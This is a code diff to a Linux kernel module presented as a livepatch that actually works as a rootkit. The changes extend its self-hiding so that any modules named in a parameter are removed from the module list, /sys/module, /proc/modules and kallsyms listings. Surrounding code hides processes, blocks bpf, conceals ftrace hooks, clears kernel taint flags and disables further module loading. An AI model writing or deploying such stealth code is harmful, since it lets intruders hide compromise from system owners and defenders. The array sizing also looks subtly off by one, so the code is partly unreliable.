@@ -91,7 +91,13 @@ struct printk_log {
 #endif
 };
 
-struct module *this_module = THIS_MODULE;
+static struct module *this_module = THIS_MODULE;
+#define MAX_NUM_MODULE_NAME 10
+static int num_module_name = 0;
+static char *hidden_module_name[MAX_NUM_MODULE_NAME-1] = {NULL,};
+struct module *hidden_module_list[MAX_NUM_MODULE_NAME-1] = {NULL,};
+module_param_array(hidden_module_name, charp, &num_module_name, 0644);
+
 static int hidden_base_exe = 0;
 module_param(hidden_base_exe, int, 0644);
 
@@ -174,7 +180,52 @@ static struct ftrace_ops *p_kprobe_ipmodify_ops = NULL;
 
 static int (*p_kernel_text_address)(unsigned long addr) = NULL;
 
+static struct module* (*p_find_module)(const char *name) = NULL;
+
 static asmlinkage bool (*real_ptrace_may_access)(struct task_struct *task, unsigned int mode);
+
+
+/*
+ No export the func <kallsyms_lookup_name> from v5.7.1
+*/
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 1)
+
+/* Symbol table format returned by kallsyms. */
+typedef struct __ksymtab {
+	unsigned long value;    /* Address of symbol */
+	const char *mod_name;   /* Module containing symbol or
+				 * "kernel" */
+	unsigned long mod_start;
+	unsigned long mod_end;
+	const char *sec_name;   /* Section containing symbol */
+	unsigned long sec_start;
+	unsigned long sec_end;
+	const char *sym_name;   /* Full symbol name, including
+				 * any version */
+	unsigned long sym_start;
+	unsigned long sym_end;
+} kdb_symtab_t;
+
+int kdbgetsymval(const char *symname, kdb_symtab_t *symtab);
+
+unsigned long find_kallsyms_addr(const char *name)
+{
+        kdb_symtab_t symtab; 
+        unsigned long addr = 0;
+        if (!name)
+                goto end;
+
+        if (kdbgetsymval(name, &symtab))
+                addr = symtab.sym_start;
+end:
+        return addr;
+
+}
+
+#define kallsyms_lookup_addr find_kallsyms_addr
+
+#endif
+
 static bool has_pid_permissions(struct pid_namespace *pid,
                                  struct task_struct *task,
                                  int hide_pid_min)
@@ -229,7 +280,7 @@ end:
 	return 0;
 }
 
-static void print_hidden_proc_name(void)
+static __attribute__((unused)) void print_hidden_proc_name(void)
 {
 	int i = 0;
 
@@ -238,6 +289,21 @@ static void print_hidden_proc_name(void)
 		if (hidden_proc_name[i] == NULL)
 			break;
 		printk(KERN_INFO " %s", hidden_proc_name[i]);
+	}
+	printk(KERN_INFO "\n");
+
+	return;
+}
+
+static __attribute__((unused)) void print_hidden_module_name(void)
+{
+	int i = 0;
+
+	printk(KERN_INFO "hidden_module_name:");
+	for (i = 0; i < num_module_name; i++) {
+		if (hidden_module_name[i] == NULL)
+			break;
+		printk(KERN_INFO " %s %pX", hidden_module_name[i], hidden_module_list[i]);
 	}
 	printk(KERN_INFO "\n");
 
@@ -286,6 +352,55 @@ static int is_hidden_proc_pid(pid_t pid)
 end:
 	return ret;
 }
+
+static void hidden_module(struct module *mod) {
+	//del from 'modules' list
+	list_del(&mod->list);
+
+	//del from /sys/module/
+	if (mod->holders_dir && mod->holders_dir->parent) {                 
+		kobject_del(mod->holders_dir->parent);                           
+	}     
+
+	p_ddebug_remove_module(mod->name);
+}
+
+static void hidden_modules(void)
+{
+	int i = 0;
+	int j = 0;
+	char *name = NULL;
+	struct module *m = NULL;
+
+	hidden_module_name[num_module_name++] = kstrdup(THIS_MODULE->name, GFP_KERNEL);
+
+	while ((name = hidden_module_name[i]) && i < MAX_NUM_MODULE_NAME) {
+		m = p_find_module(name);
+		if (m) {
+			hidden_module_list[j++] = m;
+			hidden_module(m);
+		}
+		i++;
+	}
+}
+
+static int is_hidden_module(struct module *m)
+{
+	int i = 0;
+	int ret = 0;
+
+	if (!m)
+		goto end;
+	for (i=0; i<num_module_name; i++) {
+		if (hidden_module_list[i] == m) {
+			ret = 1;
+			goto end;
+		}
+	}
+end:
+	return ret;
+}
+
 
 static struct dentry *livepatch_proc_pid_lookup(struct dentry *dentry, unsigned int flags)
 { 
@@ -422,7 +537,7 @@ static int m_show(struct seq_file *m, void *p)
         if (mod->state == MODULE_STATE_UNFORMED)
                 return 0;
 
-	if (mod == this_module)
+	if (is_hidden_module(mod))
 		return 0;
 
         seq_printf(m, "%s %u",
@@ -526,7 +641,7 @@ static int livepatch_module_get_kallsym(unsigned int symnum, unsigned long *valu
         list_for_each_entry_rcu(mod, p_modules, list) {
                 struct mod_kallsyms *kallsyms;
 
-		if (mod == this_module)
+		if (is_hidden_module(mod))
                         continue;
 
                 if (mod->state == MODULE_STATE_UNFORMED)
@@ -710,18 +825,6 @@ out:
 static int livepatch_security_bpf(int cmd, union bpf_attr *attr, unsigned int size)
 {
 	return -EPERM;
-}
-
-static void hidden_module(struct module *mod) {
-	//del from 'modules' list
-	list_del(&mod->list);
-
-	//del from /sys/module/
-	if (mod->holders_dir && mod->holders_dir->parent) {                 
-		kobject_del(mod->holders_dir->parent);                           
-	}     
-
-	p_ddebug_remove_module(mod->name);
 }
 
 static void hidden_from_sys_livepatch(struct klp_patch *klp) 
@@ -2160,12 +2263,17 @@ static int livepatch_init(void)
 	if (!p_find_get_task_by_vpid)
 		return -1;
 
+	p_find_module = (struct module *(*)(const char *name)) 
+				kallsyms_lookup_name("find_module");
+	if (!p_find_module)
+		return -1;
+
 	fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	hidden_from_enabled_functions_ftrace_hooks(hooks, ARRAY_SIZE(hooks));
 
 	ret = klp_enable_patch(&patch);
 	if (ret == 0) { 
-		hidden_module(this_module);
+		hidden_modules();
 		hidden_from_sys_livepatch(&patch);
 		hidden_from_enabled_functions_klp(objs);
 	}
@@ -2176,6 +2284,8 @@ static int livepatch_init(void)
 	clear_livepatch_tainted_mask();
 
 	*p_modules_disabled = force_modules_disabled;
+//	print_hidden_proc_name();
+//	print_hidden_module_name();
 	//clear_klog();
 
 	return ret;
